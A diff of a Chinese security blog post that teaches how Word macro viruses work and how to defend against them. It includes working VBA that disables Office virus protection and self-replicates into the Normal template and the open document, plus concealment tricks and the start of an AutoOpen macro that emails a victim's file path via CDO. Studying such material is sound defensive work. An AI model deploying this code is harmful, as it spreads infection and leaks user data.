@@ -21,24 +21,41 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"content.json"};
   </script>
 
-  <meta name="description" content="宏是一种批量处理的称谓，是指能组织到一起作为独立的命令使用的一系列Word命令，可以实现任务执行的自动化，简化日常的工作。Microsoft Office使用Visual Basic for Applications(VBA)进行宏的编写。 注意，在Office中可以直接使用Word的宏函数，而WPS需要安装VBA for WPS后才能使用。">
+  <meta name="description" content="宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。 宏病毒是Windows平台病毒中的一类，它是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行">
 <meta property="og:type" content="article">
 <meta property="og:title" content="宏病毒攻防机理">
 <meta property="og:url" content="http://example.com/posts/772b88a4.html">
 <meta property="og:site_name" content="v5le0n9&#39;s garden">
-<meta property="og:description" content="宏是一种批量处理的称谓，是指能组织到一起作为独立的命令使用的一系列Word命令，可以实现任务执行的自动化，简化日常的工作。Microsoft Office使用Visual Basic for Applications(VBA)进行宏的编写。 注意，在Office中可以直接使用Word的宏函数，而WPS需要安装VBA for WPS后才能使用。">
+<meta property="og:description" content="宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。 宏病毒是Windows平台病毒中的一类，它是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/undefined/1.2.1.png">
-<meta property="og:image" content="http://example.com/posts/undefined/1.2.2.png">
-<meta property="og:image" content="http://example.com/posts/undefined/1.2.3.png">
-<meta property="og:image" content="http://example.com/posts/undefined/1.2.4.png">
-<meta property="og:image" content="http://example.com/posts/undefined/1.2.5.png">
-<meta property="og:image" content="http://example.com/posts/undefined/1.3.1.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/1.2.1.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/1.2.2.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/1.2.3.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/1.2.4.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/1.2.5.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/1.3.2.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/1.3.3.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/1.3.1.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/2.2.1.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/2.2.2.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/2.2.3.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/2.2.4.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/2.2.5.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/2.3.1.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/2.3.2.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/4.1.1.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/4.1.2.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/4.1.3.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/4.1.5.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/4.1.6.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/4.1.4.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/5.1.1.png">
+<meta property="og:image" content="http://example.com/posts/772b88a4/5.1.2.png">
 <meta property="article:published_time" content="2022-07-02T05:54:02.122Z">
-<meta property="article:modified_time" content="2022-07-02T07:36:17.667Z">
+<meta property="article:modified_time" content="2022-07-03T02:59:49.148Z">
 <meta property="article:author" content="v5le0n9">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/posts/undefined/1.2.1.png">
+<meta name="twitter:image" content="http://example.com/posts/772b88a4/1.2.1.png">
 
 <link rel="canonical" href="http://example.com/posts/772b88a4.html">
 
@@ -219,10 +236,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-07-02 13:54:02 / 修改时间：15:36:17" itemprop="dateCreated datePublished" datetime="2022-07-02T13:54:02+08:00">2022-07-02</time>
+              <time title="创建时间：2022-07-02 13:54:02" itemprop="dateCreated datePublished" datetime="2022-07-02T13:54:02+08:00">2022-07-02</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-03 10:59:49" itemprop="dateModified" datetime="2022-07-03T10:59:49+08:00">2022-07-03</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -246,14 +269,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>805</span>
+              <span>7.7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>7 分钟</span>
             </span>
 
         </div>
@@ -265,25 +288,163 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>宏是一种批量处理的称谓，是指能组织到一起作为独立的命令使用的一系列Word命令，可以实现任务执行的自动化，简化日常的工作。Microsoft Office使用Visual Basic for Applications(VBA)进行宏的编写。</p>
-<p>注意，在Office中可以直接使用Word的宏函数，而WPS需要安装VBA for WPS后才能使用。</p>
+        <p>宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。</p>
+<p>宏病毒是Windows平台病毒中的一类，它是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。</p>
 <span id="more"></span>
 <h1 id="1-宏"><a href="#1-宏" class="headerlink" title="1. 宏"></a>1. 宏</h1><h2 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 基本概念"></a>1.1 基本概念</h2><p>宏是一种批量处理的称谓，是指能组织到一起作为独立的命令使用的一系列Word命令，可以实现任务执行的自动化，简化日常的工作。Microsoft Office使用Visual Basic for Applications(VBA)进行宏的编写。</p>
 <p>注意，在Office中可以直接使用Word的宏函数，而WPS需要安装VBA for WPS后才能使用。</p>
-<h2 id="1-2-创建宏"><a href="#1-2-创建宏" class="headerlink" title="1.2 创建宏"></a>1.2 创建宏</h2><img src="/posts/undefined/1.2.1.png" class="" title="创建宏">
+<h2 id="1-2-创建宏"><a href="#1-2-创建宏" class="headerlink" title="1.2 创建宏"></a>1.2 创建宏</h2><img src="/posts/772b88a4/1.2.1.png" class="" title="创建宏">
 <p>代码示例如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Sub test()</span><br><span class="line">&#x27;</span><br><span class="line">&#x27; test Macro</span><br><span class="line">&#x27;</span><br><span class="line">    Dim sLineNum3 As String     &#x27;行号(文字)</span><br><span class="line">    Dim nLineNum                &#x27;行号(数值)</span><br><span class="line">    Dim i As Long</span><br><span class="line"> </span><br><span class="line">    Title = &quot;输入编号信息&quot;</span><br><span class="line">    a1 = &quot;请输入总编号开始号：&quot;</span><br><span class="line">    b1 = InputBox(a1, Title)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/1.2.2.png" class="" title="创建宏">
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> test()</span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line"><span class="comment">&#x27; test Macro</span></span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line">    <span class="keyword">Dim</span> sLineNum3 <span class="keyword">As</span> <span class="type">String</span>     <span class="comment">&#x27;行号(文字)</span></span><br><span class="line">    <span class="keyword">Dim</span> nLineNum                <span class="comment">&#x27;行号(数值)</span></span><br><span class="line">    <span class="keyword">Dim</span> i <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"> </span><br><span class="line">    Title = <span class="string">&quot;输入编号信息&quot;</span></span><br><span class="line">    a1 = <span class="string">&quot;请输入总编号开始号：&quot;</span></span><br><span class="line">    b1 = InputBox(a1, Title)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
+<img src="/posts/772b88a4/1.2.2.png" class="" title="创建宏">
 <p>运行宏函数，弹出界面：</p>
-<img src="/posts/undefined/1.2.3.png" class="" title="运行宏函数">
-<img src="/posts/undefined/1.2.4.png" class="" title="运行宏函数">
+<img src="/posts/772b88a4/1.2.3.png" class="" title="运行宏函数">
+<img src="/posts/772b88a4/1.2.4.png" class="" title="运行宏函数">
 <h2 id="1-3-录制宏"><a href="#1-3-录制宏" class="headerlink" title="1.3 录制宏"></a>1.3 录制宏</h2><p>宏的默认安全性非常高，于是会导致宏程序不会自动执行，我们可以修改降低其安全性。</p>
-<p>假设我们现在有这样一个需求，将文档中的内容隐藏，该怎么做呢？传统方法是全选内容，右键 -&gt; 字体(Ctrl + D)，勾选隐藏。</p>
-<img src="/posts/undefined/1.2.5.png" class="" title="内容隐藏">
+<p>假设我们现在有这样一个需求，将文档中的内容隐藏，该怎么做呢？传统方法是全选内容(Ctrl + A)，右键 -&gt; 字体(Ctrl + D)，勾选隐藏。</p>
+<img src="/posts/772b88a4/1.2.5.png" class="" title="内容隐藏">
 <p>会将所选内容隐藏，包括图片。如果需要显示，则将隐藏选项取消勾选即可。</p>
 <p>这些小技巧往往会隐藏在病毒或木马中。那么我们是否可以将这隐藏和还原两个操作用两个快捷键关联起来呢？下次再进行相关操作时，会更加方便简洁。</p>
-<p>录制一个新宏<code>MacroHide</code>隐藏内容，再录制一个新宏<code>MacroShow</code>还原。</p>
-<img src="/posts/undefined/1.3.1.png" class="" title="录制新宏">
+<p>录制一个新宏<code>MacroHide</code>隐藏内容，快捷键为Ctrl + Shift + H。</p>
+<img src="/posts/772b88a4/1.3.2.png" class="" title="录制新宏">
+<img src="/posts/772b88a4/1.3.3.png" class="" title="录制新宏">
+<p>同样操作，再录制一个新宏<code>MacroShow</code>还原，快捷键为Ctrl + Shift + S。</p>
+<img src="/posts/772b88a4/1.3.1.png" class="" title="录制新宏">
+<p>此时，当我们按下Ctrl + Shift + H将所有内容隐藏，按下Ctrl + Shift + S所有内容显示。</p>
+<h1 id="2-宏病毒"><a href="#2-宏病毒" class="headerlink" title="2. 宏病毒"></a>2. 宏病毒</h1><h2 id="2-1-基础知识"><a href="#2-1-基础知识" class="headerlink" title="2.1 基础知识"></a>2.1 基础知识</h2><p>宏病毒是一种寄存在文档或模板的宏中的计算机病毒，存在于数据文件或模板中(字处理文档、数据表格、数据库、演示文档等)，使用宏语言编写，利用宏语言的功能将自己寄生到其它数据文档。</p>
+<p>最早的时候，人们认为数据文档是不可能带有病毒的，因为数据文档不包含指令，知道宏病毒出现才令大家改观。当我们打开带有宏病毒的文档，其中的宏就会被执行，宏病毒被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会感染上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。</p>
+<p>那么，宏病毒如何获得控制权呢？只有拿到控制权之后宏病毒才能进行传播，它和Office的特性相关。Office支持一些自动执行的宏，如果将病毒代码放到自动执行的宏中，Word打开时会给病毒传播创造条件。利用自动执行宏将病毒代码写在宏汇中，由于这些宏会自动执行，从而获取控制权。</p>
+<ol>
+<li>Word<ul>
+<li>AutoOpen：打开Word文档</li>
+<li>AutoClose：关闭Word文档</li>
+<li>AutoExec：打开Word程序</li>
+<li>AutoExit：退出Word程序</li>
+<li>AutoNew：新建宏</li>
+</ul>
+</li>
+<li>Excel<ul>
+<li>Auto_Open</li>
+<li>Auto_Close</li>
+<li>Auto_Activate</li>
+<li>Auto_Deactivate</li>
+</ul>
+</li>
+<li>Office97/2000<ul>
+<li>Document_Open</li>
+<li>Document_Close</li>
+<li>Document_New</li>
+</ul>
+</li>
+</ol>
+<h2 id="2-2-自动宏案例"><a href="#2-2-自动宏案例" class="headerlink" title="2.2 自动宏案例"></a>2.2 自动宏案例</h2><p>我们通过VB编辑器增加宏代码，定义了五个自动宏。</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">  MsgBox <span class="string">&quot;您好，您打开了Word文档！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoExec()</span><br><span class="line">  MsgBox <span class="string">&quot;您好，您打开了Word程序！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoNew()</span><br><span class="line">  MsgBox <span class="string">&quot;您好，您选择了新建文件！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoExit()</span><br><span class="line">  MsgBox <span class="string">&quot;欢迎下次光临！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoClose()</span><br><span class="line">  MsgBox <span class="string">&quot;下次还要来哦！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> MyFirstVBAProcedure()</span><br><span class="line">    <span class="keyword">Dim</span> NormProj</span><br><span class="line">    MsgBox <span class="string">&quot;欢迎光临V5LE0N9安全实验室！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line">    <span class="keyword">Set</span> NormProj = NormalTemplate.VBProject</span><br><span class="line">    MsgBox NormProj.Name, <span class="number">0</span>, <span class="string">&quot;模块文件名&quot;</span>    <span class="comment">&#x27;显示模板文件的名字</span></span><br><span class="line">    <span class="keyword">With</span> Assistant.NewBalloon           <span class="comment">&#x27;调出助手</span></span><br><span class="line">        .Icon = msoIconAlert</span><br><span class="line">        .Animation = msoAnimationGetArtsy</span><br><span class="line">        .Heading = <span class="string">&quot;Attention，Please!&quot;</span></span><br><span class="line">        .<span class="keyword">Text</span> = <span class="string">&quot;Today I turn into a martian!&quot;</span></span><br><span class="line">        .Show</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
+<img src="/posts/772b88a4/2.2.1.png" class="" title="编写自动宏">
+<p>当关闭Word程序时，首先关闭Word文档，再关闭Word程序。</p>
+<img src="/posts/772b88a4/2.2.2.png" class="" title="显示结果">
+<img src="/posts/772b88a4/2.2.3.png" class="" title="显示结果">
+<p>当运行<code>MyFirstVBAProcedure</code>宏时，弹出提示框后出现错误：</p>
+<img src="/posts/772b88a4/2.2.4.png" class="" title="出现错误">
+<img src="/posts/772b88a4/2.2.5.png" class="" title="出现错误">
+<p>暂时不知道怎么解决。</p>
+<h2 id="2-3-宏病毒感染"><a href="#2-3-宏病毒感染" class="headerlink" title="2.3 宏病毒感染"></a>2.3 宏病毒感染</h2><p>在Word和其它微软Office系列办公软件中，宏分为两种：</p>
+<ul>
+<li>内建宏：局部宏，位于文档中，对该文档有效，如打开文档(AutoOpen)、保存、打印、关闭等</li>
+<li>全局宏：位于Office模板中，为所有文档所共用，如打开Word程序(AutoExec)</li>
+</ul>
+<p>宏病毒的传播路线如下：</p>
+<ul>
+<li>单机：单个Office文档 -&gt; Office文档模板 -&gt; 多个Office文档(文档到模块感染)</li>
+<li>网络：电子邮件居多</li>
+</ul>
+<p>宏病毒感染流程：首先Office文档被感染病毒，当文档打开会执行自动宏，如果宏被执行，它会去检测当前模板是否被感染病毒。如果没有被感染，它将释放自身的病毒代码。当模板被感染之后，系统中任何一个文档被打开，都会执行模板中的病毒，宏病毒进行传播。</p>
+<p>宏病毒的感染方案就是让宏在数据文档和文档模板之间互相感染。</p>
+<img src="/posts/772b88a4/2.3.1.png" class="" title="宏病毒的感染方案">
+<p>完整代码如下：</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> test()</span><br><span class="line">    <span class="comment">&#x27;On Error Resume Next</span></span><br><span class="line">    Application.DisplayAlerts = wdAlertsNone</span><br><span class="line">    Application.EnableCancelKey = wdCancelDisabled</span><br><span class="line">    Application.DisplayStatusBar = <span class="literal">False</span></span><br><span class="line">    Options.VirusProtection = <span class="literal">False</span></span><br><span class="line">    Options.SaveNormalPrompt = <span class="literal">False</span>        <span class="comment">&#x27;以上是病毒基本的自我保护措施</span></span><br><span class="line">    <span class="keyword">Set</span> Doc = ActiveDocument.VBProject.VBComponents</span><br><span class="line">    <span class="comment">&#x27;取当前活动文档中工程组件集合</span></span><br><span class="line">    <span class="keyword">Set</span> Tmp = NormalTemplate.VBProject.VBComponents</span><br><span class="line">    <span class="comment">&#x27;取Word默认模板中工程组件集合</span></span><br><span class="line">    <span class="keyword">Const</span> ExportSource = <span class="string">&quot;c:\jackie.sys&quot;</span></span><br><span class="line">    <span class="keyword">Const</span> VirusName = <span class="string">&quot;AIGTMV1&quot;</span>               <span class="comment">&#x27;该字符串相当于一个病毒感染标志</span></span><br><span class="line">    Application.VBE.ActiveVBProject.VBComponents(VirusName).Export ExportSource</span><br><span class="line">                                 <span class="comment">&#x27;将当前病毒代码导出到c:\jackie.sys文件保存</span></span><br><span class="line">                                 </span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> Tmp.Count</span><br><span class="line">        <span class="keyword">If</span> Tmp(i).Name = VirusName <span class="keyword">Then</span> TmpInstalled = <span class="number">1</span></span><br><span class="line">     <span class="comment">&#x27;检查模板是否已经被感染病毒</span></span><br><span class="line">    <span class="keyword">Next</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">For</span> j = <span class="number">1</span> <span class="keyword">To</span> Doc.Count</span><br><span class="line">        <span class="keyword">If</span> Doc(j).Name = VirusName <span class="keyword">Then</span> DocInstalled = <span class="number">1</span></span><br><span class="line">                                     <span class="comment">&#x27;检查当前活动文档是否已被感染病毒</span></span><br><span class="line">    <span class="keyword">Next</span> j</span><br><span class="line">    <span class="keyword">If</span> TmpInstalled = <span class="number">0</span> <span class="keyword">Then</span>                 <span class="comment">&#x27;如果模板没有被感染，对其进行感染</span></span><br><span class="line">        Tmp.Import ExportSource              <span class="comment">&#x27;从c:\jackie.sys将病毒导入模板</span></span><br><span class="line">        NormalTemplate.Save                  <span class="comment">&#x27;自动保存模板，以免引起用户怀疑</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">If</span> DocInstalled = <span class="number">0</span> <span class="keyword">Then</span>                 <span class="comment">&#x27;如果当前活动文档没有被感染</span></span><br><span class="line">        Doc.Import ExportSource              <span class="comment">&#x27;从c:\jackie.sys将病毒导入当前活动文档</span></span><br><span class="line">        ActiveDocument.SaveAs ActiveDocument.FullName <span class="comment">&#x27;自动保存当前活动文档</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    MsgBox <span class="string">&quot;Word instructional macro by jackie&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Word.APMP&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
+<p>宏病毒也可以通过网络进行传播，例如电子邮件。</p>
+<ul>
+<li>Mellisa病毒：自动往OutLook邮件用户地址簿中的前50位用户发送病毒副本</li>
+<li>“叛逃者”病毒：集成了感染Office文档的宏病毒感染功能，并且可以通过OutLook发送病毒副本</li>
+</ul>
+<img src="/posts/772b88a4/2.3.2.png" class="" title="通过电子邮件传播">
+<h1 id="3-宏病毒的自我保护与防御"><a href="#3-宏病毒的自我保护与防御" class="headerlink" title="3. 宏病毒的自我保护与防御"></a>3. 宏病毒的自我保护与防御</h1><p>宏病毒的自我保护主要包括三种方法：</p>
+<ol>
+<li><p>禁止提示信息</p>
+<p>On Error Resume Next 如果发生错误，不弹出出错窗口，继续往下执行语句</p>
+<p>Application.DisplayAlerts = wdAlertsNone 不弹出警告窗口</p>
+<p>Application.DisplayStatusBar = False 不显示状态栏，以免显示宏的运行状态</p>
+<p>Options.VirusProtection = False 关闭病毒保护功能，运行前如果包含宏，不提示</p>
+<p>…</p>
+</li>
+<li><p>屏蔽命令菜单，不允许查看宏</p>
+<ul>
+<li><p>通过特定宏定义</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> ViewVBCode()</span><br><span class="line">    MsgBox <span class="string">&quot;Unexcpected error&quot;</span>,<span class="number">16</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
+<p><code>ViewCode</code>过程和<code>ViewVBCode</code>函数一样，如果用户按工具栏上的小图标就会执行这个过程。</p>
+</li>
+<li><p>Disable或删除特定菜单项</p>
+<p>用来使“视图 -&gt; 宏”菜单失效的语句</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CommandBars(<span class="string">&quot;Tools&quot;</span>).Controls(<span class="number">16</span>).Enabled = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>隐藏宏的真实病毒代码</p>
+<p>在自动宏中，不包括任何感染或破坏的代码，但包含了创建、执行和删除新宏(实际进行感染和破坏的宏)的代码，将宏代码字体颜色设置成与背景一样的白色等</p>
+</li>
+</ol>
+<p>宏病毒的防御措施包括：</p>
+<ul>
+<li>一旦发现计算机Office软件打开后弹出系统警告框，并且无法“另存为”，就表示该文件已感染宏病毒，此时不能再打开其它文件，否则其它文件也会被感染，应马上关闭删除该文件。若文件重要不能删除，则需用杀毒软件全盘扫描，处理感染文件。</li>
+<li>开启禁用宏进行防止再次感染病毒。在“受信任位置”中，删除“可靠来源”列表框中的不安全来源，根据实际情况设置是否信任所有安装的加载项和模板，设置宏的安全性。</li>
+<li>安装杀毒软件，打全系统补丁是预防计算机病毒的基本措施，当然也适用于宏病毒。除此之外，宏病毒还有专门的防治措施。</li>
+<li>在线沙箱检测文档是否包含宏病毒。</li>
+</ul>
+<h1 id="4-案例：CDO自发邮箱"><a href="#4-案例：CDO自发邮箱" class="headerlink" title="4. 案例：CDO自发邮箱"></a>4. 案例：CDO自发邮箱</h1><p>接下来我们制作一个宏，当对方打开文档时就知道该文档在对方电脑存储的具体路径。常见方法包括：</p>
+<ul>
+<li>邮件组件，如CDO组件</li>
+<li>远程脚本</li>
+</ul>
+<p>这里采用CDO自发邮件实现。通过Word VB编写脚本，设置文档打开时运行，利用CDO发送电子邮件将文件的路径和名字发送到指定邮箱中。具体步骤如下：</p>
+<ol>
+<li>利用<code>AutoOpen</code>执行并打开文档时运行</li>
+<li>利用<code>WordObj.ActiveDocument</code>获取文件信息</li>
+<li>利用CDO实现电子邮件信息传递</li>
+</ol>
+<p>注意，千万别小瞧这个功能，如果是一封钓鱼邮件或运行宏病毒自动采集个人电脑信息发送至指定邮箱，其危害性非常大，而且该攻击手段广泛存在于许多亚洲攻击组织中。</p>
+<p>新建宏函数<code>AutoOpen</code>，核心代码如下：</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line"><span class="comment">&#x27; AutoOpen宏</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 获取文件夹路径</span></span><br><span class="line">    <span class="keyword">Dim</span> WordObj <span class="keyword">As</span> <span class="type">Object</span></span><br><span class="line">    <span class="keyword">Dim</span> Doc <span class="keyword">As</span> <span class="type">Object</span></span><br><span class="line">    <span class="keyword">Set</span> WordObj = GetObject(, <span class="string">&quot;Word.Application&quot;</span>)</span><br><span class="line">    <span class="keyword">Set</span> Doc = WordObj.ActiveDocument</span><br><span class="line">    MsgBox (Doc.Path)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 定义邮件地址</span></span><br><span class="line">    <span class="keyword">Const</span> from1 = <span class="string">&quot;152xxxxxxxx@163.com&quot;</span></span><br><span class="line">    <span 